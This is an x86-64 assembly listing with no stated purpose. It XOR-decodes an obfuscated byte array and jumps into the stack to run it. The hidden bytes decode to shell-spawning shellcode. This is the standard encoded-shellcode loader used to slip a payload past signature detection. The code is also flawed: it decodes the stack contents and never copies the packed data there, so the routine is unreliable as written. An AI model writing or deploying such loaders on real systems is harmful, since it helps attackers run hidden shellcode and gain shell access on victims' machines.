

section .text
	global main

	main:
		sub rsp, 40	; allocate space on stack
		xor rcx, rcx    ; init counter
		mov r8, 0x6c495a33353b4c50 ; key
		
; --------------------------------------------------------------------

	unpack:	
		mov r10, qword[rsp+rcx]
		xor r10, r8
		mov qword[rsp+rcx], r10
		add rcx, 0x8
		cmp rcx, packed_len
		jne unpack
	
; --------------------------------------------------------------------

	execute_me:
		mov rbx, rsp
		jmp rbx



section .data
	packed db 0x18, 0x7d, 0xfb, 0x65, 0x7b, 0xe2, 0x66, 0xe, 0x39, 0x22, 0x14, 0x1a, 0x40, 0x32, 0x19, 0x24, 0xd9, 0xab, 0x73, 0x4, 0xc5, 0x12, 0x78, 0xbe, 0x18, 0x7d, 0xfb, 0x7d, 0xb0, 0x9a, 0x72, 0x63, 0x55, 0x4c, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
	packed_len equ $-packed
